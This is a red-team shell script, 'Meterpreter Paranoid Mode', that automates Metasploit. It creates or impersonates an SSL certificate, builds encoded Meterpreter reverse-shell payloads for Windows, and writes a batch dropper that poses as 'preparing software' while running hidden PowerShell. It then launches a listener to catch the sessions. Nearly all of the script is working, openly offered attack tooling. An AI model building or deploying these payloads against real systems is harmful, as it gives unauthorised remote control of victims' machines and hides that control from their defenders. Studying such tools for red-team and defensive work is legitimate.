#!/bin/sh
##
# Meterpreter Paranoid Mode - SSL/TLS connections
# Author: pedr0 Ubuntu [r00t-3xp10it] version: 1.2
# Suspicious-Shell-Activity (SSA) RedTeam dev @2017
# ---
#
# DESCRIPTION:
# In some scenarios, it pays to be paranoid. This also applies to generating
# and handling Meterpreter sessions. This script implements the Meterpreter
# paranoid mode (SSL/TLS) payload build, by creating a SSL/TLS Certificate
# (manual OR impersonate) to use in connection (server + client) ..
# "The SHA1 hash its used to validate the connetion betuiwn handler/payload"
# ---
#
# SPECIAL THANKS (POCs):
# hdmoore | oj | darkoperator
# http://buffered.io/posts/staged-vs-stageless-handlers/
# https://github.com/rapid7/metasploit-framework/wiki/Meterpreter-Paranoid-Mode
# https://www.darkoperator.com/blog/2015/6/14/tip-meterpreter-ssl-certificate-validation
##




#
# Tool variable declarations _______________
#                                           |
V3R="1.2"                                   # Tool version release
IPATH=`pwd`                                 # Store tool full install path
ChEk_DB="OFF"                               # Rebuild msfdb database (postgresql)?
DEFAULT_EXT="bat"                           # Default payload extension to use (bat | ps1 | txt)
ENCODE="x86/shikata_ga_nai"                 # Msf encoder to use to encode payload (32bits | 64bits)
ENCODE_NUMB="3"                             # How many interactions to encode payload (0 | 9)
# __________________________________________|



###
# Resize terminal windows size befor running the tool (gnome terminal)
# Special thanks to h4x0r Milton@Barra for this little piece of heaven! :D
resize -s 39 80 > /dev/null



#
# Pass arguments to script [ ./Meterpreter_Paranoid_Mode.sh -h ]
#
while getopts ":h" opt; do
  case $opt in
    h)
cat << !
---
-- Author: r00t-3xp10it | SSA RedTeam @2017
-- Special-Thanks: HD-moore, OJ, DarkOperator
-- Supported: Linux Kali, Ubuntu, Mint, Parrot OS
-- Suspicious-Shell-Activity (SSA) RedTeam develop @2017
---

 Meterpreter_Paranoid_Mode.sh allows users to secure your staged/stageless
 connection for Meterpreter by having it check the certificate of the
 handler it is connecting to.

 We start by generating a certificate in PEM format, once the certs have
 been created we can create a HTTP or HTTPS or EXE payload for it and give
 it the path of PEM format certificate to be used to validate the connection.

 To have the connection validated we need to tell the payload what certificate
 the handler will be using by setting the path to the PEM certificate in the
 HANDLERSSLCERT option then we enable the checking of this certificate by
 setting stagerverifysslcert to true.

 Once that payload is created we need to create a handler to receive the
 connection and again we use the PEM certificate so the handler can use the
 SHA1 hash for validation. Just like with the Payload we set the parameters
 HANDLERSSLCERT with the path to the PEM file and stagerverifysslcert to true. 


When we get payload execution, we can see the stage doing the validation
[*] 192.168.1.67:666 (UUID: db09ad1/x86=1/windows=1/2017-05-13 Staging payload
[*] Meterpreter will verify SSL Certificate with SHA1 hash 5fefcc6cae205d8c884
[*] Meterpreter session 1 opened (192.168.1.69:8081 -> 192.168.1.67:666)

!
   exit
    ;;
    \?)
      echo " Invalid option: -$OPTARG "
      exit
    ;;
  esac
done



#
# Colorise shell Script output leters
#
Colors() {
Escape="\033";
  white="${Escape}[0m";
  RedF="${Escape}[31m";
  GreenF="${Escape}[32m";
  YellowF="${Escape}[33m";
  BlueF="${Escape}[34m";
  CyanF="${Escape}[36m";
Reset="${Escape}[0m";
}



#
# Check tool dependencies ..
#
Colors;
npm=`which msfconsole`
if [ "$?" != "0" ]; then
echo ""
echo ${RedF}[☠]${white} msfconsole '->' not found! ${Reset};
sleep 1
echo ${RedF}[☠]${white} This script requires metasploit to work! ${Reset};
exit
fi



#
# rebuild msfdb? (postgresql) 
# 
if [ "$ChEk_DB" = "ON" ]; then
  #
  # start msfconsole to check postgresql connection status
  #
  echo ${BlueF}[☆]${white}" Starting postgresql service .."${Reset};
  service postgresql start | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Start postgresql service" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
  echo ${BlueF}[☆]${white}" Checking msfdb connection status .."${Reset};
  # Store db_status core command into one variable
  ih=`msfconsole -q -x 'db_status; exit -y' | awk {'print $3'}`
    if [ "$ih" != "connected" ]; then
      echo ${RedF}[x]${white}" postgresql selected, no connection .."${Reset};
      echo ${BlueF}[☆]${white}" Please wait, rebuilding msf database .."${Reset};
      # rebuild msf database (database.yml)
      msfdb reinit | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Rebuild metasploit database" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
      echo ${GreenF}[✔]${white}" postgresql connected to msf .."${Reset};
      sleep 3
    else
      echo ${GreenF}[✔]${white}" postgresql connected to msf .."${Reset};
      sleep 3
    fi
fi



#
# grab Operative System distro to store IP addr
# output = Ubuntu OR Kali OR Parrot OR BackBox
#
DiStR0=`awk '{print $1}' /etc/issue` # grab distribution -  Ubuntu or Kali
InT3R=`netstat -r | grep "default" | awk {'print $8'}` # grab interface in use
case $DiStR0 in
    Kali) IP=`ifconfig $InT3R | egrep -w "inet" | awk '{print $2}'`;;
    Debian) IP=`ifconfig $InT3R | egrep -w "inet" | awk '{print $2}'`;;
    Ubuntu) IP=`ifconfig $InT3R | egrep -w "inet" | cut -d ':' -f2 | cut -d 'B' -f1`;;
    Parrot) IP=`ifconfig $InT3R | egrep -w "inet" | cut -d ':' -f2 | cut -d 'B' -f1`;;
    BackBox) IP=`ifconfig $InT3R | egrep -w "inet" | cut -d ':' -f2 | cut -d 'B' -f1`;;
    elementary) IP=`ifconfig $InT3R | egrep -w "inet" | cut -d ':' -f2 | cut -d 'B' -f1`;;
    *) IP=`zenity --title="☠ Input your IP addr ☠" --text "example: 192.168.1.68" --entry --width 300`;;
  esac
clear



#
# Tool main menu banner ..
# we can abort (ctrl+c) tool execution at this point ..
#
cat << !

    ███╗   ███╗██████╗███╗   ███╗ 
    ████╗ ████║██╗ ██║████╗ ████║ 
    ██╔████╔██║██████║██╔████╔██║
    ██║╚██╔╝██║██╔═══╝██║╚██╔╝██║ 
    ██║ ╚═╝ ██║██║    ██║ ╚═╝ ██║
    ╚═╝     ╚═╝╚═╝    ╚═╝     ╚═╝Author::r00t-3xp10it
!
echo ${white}"    MPM©${RedF}::${white}v$V3R${RedF}::${white}Suspicious_Shell_Activity©${RedF}::${white}Red_Team${RedF}::${white}2017"${Reset};
echo "${BlueF}    ╔───────────────────────────────────────────────────────╗"
echo "${BlueF}    |${YellowF}    Meterpreter Paranoid Mode (SSL/TLS) connections    ${BlueF}|"
echo "${BlueF}    ╠───────────────────────────────────────────────────────╣"
echo "${BlueF}    |${white} This tool allow users to secure your staged/stageless ${BlueF}|"
echo "${BlueF}    |${white} connections (https) for meterpreter by having it check${BlueF}|"
echo "${BlueF}    |${white}  the certificate of the handler it is connecting to.  ${BlueF}|"
echo "${BlueF}    ╠───────────────────────────────────────────────────────╝"
sleep 1
echo "${BlueF}    ╘ ${white}Press [${YellowF} ENTER ${white}] to continue${RedF}!${Reset}"
echo ""
read OP



#
# Chose payload categorie to be used (staged/stageless) ..
#
cHos=$(zenity --list --title "☠ CERTIFICATE BUILD ☠" --text "\nChose option:" --radiolist --column "Pick" --column "Option" TRUE "manual certificate" FALSE "impersonate domain" --width 300 --height 160) > /dev/null 2>&1
if [ "$cHos" = "manual certificate" ]; then
  #
  # SSA TEAM CERTIFICATE or your OWN (manual creation)
  #
  echo ${BlueF}[☠]${white} Input pem settings ..${Reset};
  CoNtRy=$(zenity --title="☠ Enter  CONTRY CODE ☠" --text "example: US" --entry --width 270) > /dev/null 2>&1
  StAtE=$(zenity --title="☠ Enter  STATE CODE ☠" --text "example: Texas" --entry --width 270) > /dev/null 2>&1
  CiTy=$(zenity --title="☠ Enter  CITY NAME ☠" --text "example: Austin" --entry --width 270) > /dev/null 2>&1
  OrGa=$(zenity --title="☠ Enter  ORGANISATION ☠" --text "example: Development" --entry --width 270) > /dev/null 2>&1
  N4M3=$(zenity --title="☠ Enter  DOMAIN NAME ☠" --text "example: ssa-team.com" --entry --width 270) > /dev/null 2>&1
  cd $IPATH/output
  echo ${BlueF}[☠]${white} Building certificate ..${BlueF};
  openssl req -new -newkey rsa:4096 -days 365 -nodes -x509 -subj "/C=$CoNtRy/ST=$StAtE/L=$CiTy/O=$OrGa/CN=$N4M3" -keyout $N4M3.key -out $N4M3.crt && cat $N4M3.key $N4M3.crt > $N4M3.pem && rm -f $N4M3.key $N4M3.crt
  echo ${BlueF}[☠]${white}" Stored: output/$N4M3.pem .."${BlueF};
  sleep 1

elif [ "$cHos" = "impersonate domain" ]; then
  #
  # Impersonate a legit domain (msf auxiliary module)
  # Copy files generated to proper location and cleanup ..
  #
  echo ${BlueF}[☠]${white} Input pem settings ..${Reset};
  N4M3=$(zenity --title="☠ Enter  DOMAIN NAME ☠" --text "example: ssa-team.com" --entry --width 270) > /dev/null 2>&1
  echo ${BlueF}[☠]${white} Building certificate ..${BlueF};
  xterm -T "MPM - IMPERSONATE CERTIFICATE" -geometry 121x26 -e "msfconsole -q -x 'use auxiliary/gather/impersonate_ssl; set RHOST $N4M3; exploit; sleep 3; exit -y'"
  echo "Impersonating $N4M3 RSA private key"
  sleep 1
  echo "............................................................................................................................."
  sleep 1
  echo "Writing new private key to '$N4M3.key'"
  lOoT=`locate .msf4/loot`
  cd $lOoT
  # Cleanup, copy/paste in output folder ..
  mv *.pem $IPATH/output/$N4M3.pem > /dev/null 2>&1
  rm *.key && rm *.crt && rm *.log > /dev/null 2>&1
  echo ${BlueF}[☠]${white}" Stored: output/$N4M3.pem .."${BlueF};
  cd $IPATH/output
  sleep 1

else
  #
  # Cancel button pressed, aborting script execution ..
  #
  echo ${RedF}[x]${white}" Cancel button pressed, aborting .."
  if [ "$ChEk_DB" = "ON" ]; then
  service postgresql stop | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Stop postgresql service" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
  fi
  sleep 2
  exit
fi



#
# Chose to build a staged (payload.bat|ps1|txt) or a stageless (payload.exe) ..
#
BuIlD=$(zenity --list --title "☠ AUTO-BUILD PAYLOAD ☠" --text "\nChose payload categorie:" --radiolist --column "Pick" --column "Option" TRUE "staged (payload.$DEFAULT_EXT)" FALSE "stageless (payload.exe)" --width 300 --height 160) > /dev/null 2>&1
#
# Staged payload build (batch output)
# HINT: Edit script and change 'DEFAULT_EXT=bat' to the extension required ..
#
if [ "$BuIlD" = "staged (payload.$DEFAULT_EXT)" ]; then
  echo ${BlueF}[☠]${white} staged payload sellected ..${Reset};
  sleep 1
    #
    # Create a Paranoid Payload (staged payload)
    # For this use case, we will combine Payload UUID tracking with TLS pinning.
    #
    echo ${BlueF}[☠]${white} Building staged payload ..${BlueF};
    LhOsT=$(zenity --title="☠ Enter  LHOST ☠" --text "example: $IP" --entry --width 270) > /dev/null 2>&1
    LpOrT=$(zenity --title="☠ Enter  LPORT ☠" --text "example: 1337" --entry --width 270) > /dev/null 2>&1
    paylo=$(zenity --list --title "☠ AUTO-BUILD PAYLOAD ☠" --text "\nChose payload to build:" --radiolist --column "Pick" --column "Option" TRUE "windows/meterpreter/reverse_winhttps" FALSE "windows/meterpreter/reverse_https" FALSE "windows/x64/meterpreter/reverse_https" FALSE "windows/meterpreter/reverse_http" FALSE "windows/meterpreter/reverse_tcp" --width 350 --height 280) > /dev/null 2>&1
    msfvenom -p $paylo LHOST=$LhOsT LPORT=$LpOrT PayloadUUIDTracking=true HandlerSSLCert=$IPATH/output/$N4M3.pem StagerVerifySSLCert=true PayloadUUIDName=ParanoidStagedPSH --platform windows --smallest -e $ENCODE -i $ENCODE_NUMB -f psh-cmd -o paranoid-staged.$DEFAULT_EXT

      #
      # head - paranoid-staged.bat
      #
      str0=`cat $IPATH/output/paranoid-staged.$DEFAULT_EXT | awk {'print $12'}`
      rm $IPATH/output/paranoid-staged.$DEFAULT_EXT > /dev/null 2>&1
      # build trigger.bat template
      echo ${BlueF}[☠]${white} Building template ..${Reset};
      sleep 2
      echo ":: template batch | Author: r00t-3xp10it" > $IPATH/output/template.bat
      echo ":: ---" >> $IPATH/output/template.bat
      echo "@echo off" >> $IPATH/output/template.bat
      echo "echo [*] Please wait, preparing software ..." >> $IPATH/output/template.bat
      echo "%COMSPEC% /b /c start /b /min powershell.exe -nop -w hidden -e $str0" >> $IPATH/output/template.bat
      echo "exit" >> $IPATH/output/template.bat
      mv -f template.bat paranoid-staged.$DEFAULT_EXT
      sleep 2

  # 
  # Create the staged Paranoid Listener (multi-handler)
  #
  # A staged payload would need to set the HandlerSSLCert and
  # StagerVerifySSLCert true options to enable TLS pinning:
  echo ${BlueF}[☠]${white} Start multi-handler ..${Reset};
  xterm -T "MPM - MULTI-HANDLER" -geometry 121x26 -e "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD $paylo; set LHOST $LhOsT; set LPORT $LpOrT; set HandlerSSLCert $IPATH/output/$N4M3.pem; set StagerVerifySSLCert true; run -j'"
  echo ${BlueF}[☠]${white} Module excution finished ..${Reset};
  sleep 2


#
# Stageless payload build (exe output)
#
elif [ "$BuIlD" = "stageless (payload.exe)" ]; then
  echo ${BlueF}[☠]${white} stageless payload sellected ..${Reset};
  sleep 1
    #
    # Chose payload to use Building a stageless agent ..
    #
    cd $IPATH/output
    echo ${BlueF}[☠]${white} Building stageless payload ..${BlueF};
    LhOsT=$(zenity --title="☠ Enter  LHOST ☠" --text "example: $IP" --entry --width 270) > /dev/null 2>&1
    LpOrT=$(zenity --title="☠ Enter  LPORT ☠" --text "example: 1337" --entry --width 270) > /dev/null 2>&1
    paylo=$(zenity --list --title "☠ AUTO-BUILD PAYLOAD ☠" --text "\nChose payload to build:" --radiolist --column "Pick" --column "Option" TRUE "windows/meterpreter_reverse_https" FALSE "windows/x64/meterpreter_reverse_https" FALSE "windows/meterpreter_reverse_http" --width 350 --height 220) > /dev/null 2>&1
    msfvenom -p $paylo LHOST=$LhOsT LPORT=$LpOrT PayloadUUIDTracking=true HandlerSSLCert=$IPATH/output/$N4M3.pem StagerVerifySSLCert=true PayloadUUIDName=ParanoidStagedStageless --platform windows --smallest -e $ENCODE -i $ENCODE_NUMB -f exe -o paranoid-stageless.exe
    sleep 2


  #
  # Create a stageless Paranoid Listener (multi-handler)..
  #     
  # A stageless payload would need to set the HandlerSSLCert and
  # StagerVerifySSLCert true options to enable TLS pinning:
  echo ${BlueF}[☠]${white} Start multi-handler ..${Reset};
  xterm -T "MPM - MULTI-HANDLER" -geometry 121x26 -e "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD $paylo; set LHOST $LhOsT; set LPORT $LpOrT; set HandlerSSLCert $IPATH/output/$N4M3.pem; set StagerVerifySSLCert true; run -j'"
  echo ${BlueF}[☠]${white} Module excution finished ..${Reset};
  sleep 2


else
  #
  # Cancel button pressed, aborting script execution ..
  #
  echo ${RedF}[x]${white}" Cancel button pressed, aborting .."
  if [ "$ChEk_DB" = "ON" ]; then
  service postgresql stop | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Stop postgresql service" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
  fi
  sleep 2
  exit
fi



#
# The End ..
#
if [ "$ChEk_DB" = "ON" ]; then
service postgresql stop | zenity --progress --pulsate --title "☠ PLEASE WAIT ☠" --text="Stop postgresql service" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
fi
sleep 1
exit






